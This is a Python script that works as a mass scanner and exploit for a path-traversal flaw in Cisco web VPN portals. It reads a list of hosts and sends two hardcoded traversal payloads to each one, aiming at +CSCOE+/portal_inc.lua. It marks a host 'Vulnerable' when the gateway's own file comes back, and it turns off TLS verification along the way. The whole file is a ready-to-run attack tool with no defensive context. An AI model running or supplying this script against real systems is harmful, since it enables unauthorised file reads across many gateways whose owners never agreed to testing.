#!/usr/bin/env python

import sys
import requests
import urllib3

from requests.exceptions import ReadTimeout, ConnectionError, InvalidURL, TooManyRedirects

PAYLOAD1="/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
PAYLOAD2="/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua"


def check_url(url, count, total):
    print(f"Trying {count}/{total}: {url}" + (" " * 15), end='\r', file=sys.stderr)
    try:
        r = requests.get(url, timeout=1, verify=False)
        if r.status_code == 200:
            content_str = str(r.content)
            if "cisco systems" in content_str.lower():
                print(f"\nVulnerable: {url}")
    except (UnicodeDecodeError, ConnectionError, ReadTimeout, InvalidURL, TooManyRedirects):
        pass



def main(file_input):
    with open(file_input, "r") as f:
        lines = f.readlines()
        lines = [o.strip().strip("/") for o in lines]
        lines = sorted(set(lines))

    total = len(lines)

    count = 0
    for line in lines:
        count += 1
        if not (line.startswith("http://") or line.startswith("https://")):
            line = "http://" + line
            
        check_url(line + PAYLOAD1, count, total)
        check_url(line + PAYLOAD2, count, total)


if __name__ == '__main__':
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    main(sys.argv[1])
